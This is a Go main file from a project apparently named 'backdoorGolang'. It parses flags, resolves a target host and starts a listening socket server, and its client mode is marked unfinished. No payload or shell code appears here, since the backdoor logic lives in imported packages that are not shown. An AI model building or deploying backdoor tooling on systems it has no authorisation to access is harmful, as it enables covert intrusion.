package main

import (
	"fmt"

	"github.com/pilebones/backdoorGolang/core/cli"
	"github.com/pilebones/backdoorGolang/core/socket/server"
	// "github.com/pilebones/backdoorGolang/core/socket/client"
	// "github.com/pilebones/backdoorGolang/core/socket"
)

func main() {

	// Parsing & validate arguments before running
	var context cli.Context = cli.InitFlags()

	// Display target resolution before create socket provider
	if context.Target.HostCanBeResolv() {
		fmt.Printf("Target resolved to %s (%s)\n", context.Target.Ipv4.String(), context.Target.Ipv6.String())
	}

	if context.UseListenMode { // Server mode
		fmt.Printf("Listening on %s:%d\n", context.Target.Host, context.Target.Port)
		// var server server.ServerProvider = server.Create(context.(socket.SocketWrapper))
		var server server.ServerProvider = server.Create(context.Target, context.UseDebugMode)
		server.Start()

	} else { // Client mode
		fmt.Printf("Init client mode : feature not fully implemented yet work in progress\n")
		// var clientProvider client.ClientProvider = client.CreateClient(context.Host, context.Port, context.UseDebugMode)
	}
}
